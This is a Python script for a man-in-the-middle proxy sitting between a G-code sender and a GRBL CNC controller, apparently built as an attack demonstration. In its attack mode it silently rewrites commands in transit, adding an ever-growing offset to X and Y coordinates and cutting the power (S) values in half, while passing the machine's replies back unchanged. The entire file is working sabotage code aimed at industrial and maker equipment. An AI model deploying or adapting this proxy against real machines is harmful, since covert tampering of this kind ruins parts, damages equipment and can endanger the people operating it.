#!/usr/bin/env python3
"""
Working GRBL Proxy with Attack Capabilities
Handles GRBL handshake properly
Save as: working_proxy.py
Run as: sudo python3 working_proxy.py
"""

import socket
import threading
import time
import re
from datetime import datetime

class GRBLProxy:
    def __init__(self):
        self.cnc_ip = "192.168.0.170"
        self.cnc_port = 8080
        self.proxy_port = 8888
        
        # Attack settings
        self.enable_attacks = False
        self.drift_amount = 0.0
        self.drift_increment = 0.1
        
        # Statistics
        self.commands_seen = 0
        self.commands_modified = 0
        
    def start(self):
        """Start the proxy server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.proxy_port))
        server.listen(1)
        
        print(f"[+] GRBL Proxy listening on port {self.proxy_port}")
        print(f"[+] Forwarding to {self.cnc_ip}:{self.cnc_port}")
        print(f"[+] Attacks: {'ENABLED' if self.enable_attacks else 'DISABLED'}")
        print("-" * 60)
        print("Configure your G-code sender to:")
        print(f"  IP: 10.211.55.3")
        print(f"  Port: {self.proxy_port}")
        print("-" * 60)
        
        try:
            while True:
                client, addr = server.accept()
                print(f"\n[+] Connection from {addr[0]}:{addr[1]}")
                
                # Handle each connection
                handler = threading.Thread(
                    target=self.handle_connection,
                    args=(client,),
                    daemon=True
                )
                handler.start()
                
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
        finally:
            server.close()
            self.print_stats()
    
    def handle_connection(self, client):
        """Handle a client connection"""
        cnc = None
        try:
            # Connect to real CNC
            cnc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cnc.settimeout(5)
            cnc.connect((self.cnc_ip, self.cnc_port))
            print(f"[+] Connected to CNC")
            
            # IMPORTANT: Get initial GRBL greeting
            cnc.settimeout(1)
            try:
                greeting = cnc.recv(1024)
                if greeting:
                    print(f"[<] CNC Greeting: {greeting.decode('utf-8', errors='ignore').strip()}")
                    client.send(greeting)  # Forward to client
            except socket.timeout:
                # Some GRBL versions don't send greeting
                pass
            
            # Set sockets to non-blocking for select loop
            client.settimeout(0.1)
            cnc.settimeout(0.1)
            
            # Main forwarding loop
            while True:
                # Client -> CNC
                try:
                    data = client.recv(4096)
                    if not data:
                        break
                    
                    # Process G-code
                    modified_data = self.process_gcode(data)
                    cnc.send(modified_data)
                    
                except socket.timeout:
                    pass
                except:
                    break
                
                # CNC -> Client
                try:
                    response = cnc.recv(4096)
                    if response:
                        # Log response
                        resp_text = response.decode('utf-8', errors='ignore').strip()
                        if resp_text and resp_text != 'ok':
                            print(f"[<] CNC: {resp_text[:80]}")
                        
                        client.send(response)
                except socket.timeout:
                    pass
                except:
                    break
                    
        except Exception as e:
            print(f"[!] Connection error: {e}")
        finally:
            if cnc:
                cnc.close()
            client.close()
            print("[*] Connection closed")
    
    def process_gcode(self, data):
        """Process and potentially modify G-code"""
        try:
            text = data.decode('utf-8', errors='ignore')
            
            # Log the command
            for line in text.split('\n'):
                line = line.strip()
                if line and not line.startswith('$'):
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    print(f"[{timestamp}] > {line[:80]}")
                    self.commands_seen += 1
                    
                    # Apply attacks if enabled
                    if self.enable_attacks:
                        modified = self.apply_attacks(line)
                        if modified != line:
                            print(f"[ATTACK] Modified to: {modified}")
                            self.commands_modified += 1
                            # Replace in data
                            text = text.replace(line, modified)
            
            return text.encode('utf-8')
            
        except:
            return data  # Return unchanged if not text
    
    def apply_attacks(self, command):
        """Apply attack modifications"""
        modified = command
        
        # Calibration drift attack
        for axis in ['X', 'Y']:
            match = re.search(f'{axis}([\\-\\d.]+)', command)
            if match:
                original = float(match.group(1))
                drifted = original + self.drift_amount
                modified = modified.replace(
                    f'{axis}{original}',
                    f'{axis}{drifted:.2f}'
                )
        
        # Increment drift for next command
        if 'X' in command or 'Y' in command:
            self.drift_amount += self.drift_increment
        
        # Power reduction attack
        match = re.search(r'S(\d+)', command)
        if match:
            power = int(match.group(1))
            reduced = int(power * 0.5)  # 50% reduction
            modified = modified.replace(f'S{power}', f'S{reduced}')
        
        return modified
    
    def print_stats(self):
        """Print statistics"""
        print("\n" + "="*60)
        print("STATISTICS")
        print("="*60)
        print(f"Commands seen: {self.commands_seen}")
        print(f"Commands modified: {self.commands_modified}")
        if self.commands_seen > 0:
            mod_rate = (self.commands_modified / self.commands_seen) * 100
            print(f"Modification rate: {mod_rate:.1f}%")

def main():
    print("="*60)
    print("GRBL PROXY WITH ATTACK SIMULATION")
    print("="*60)
    
    proxy = GRBLProxy()
    
    # Configuration
    print("\nConfiguration:")
    print(f"1. Passive mode (monitor only)")
    print(f"2. Attack mode (modify commands)")
    
    choice = input("Select mode [1]: ").strip() or "1"
    
    if choice == "2":
        proxy.enable_attacks = True
        print("\n[!] Attack mode enabled!")
        print("    - Calibration drift will be applied")
        print("    - Power will be reduced by 50%")
    
    print("\n[*] Starting proxy...")
    proxy.start()

if __name__ == "__main__":
    main()
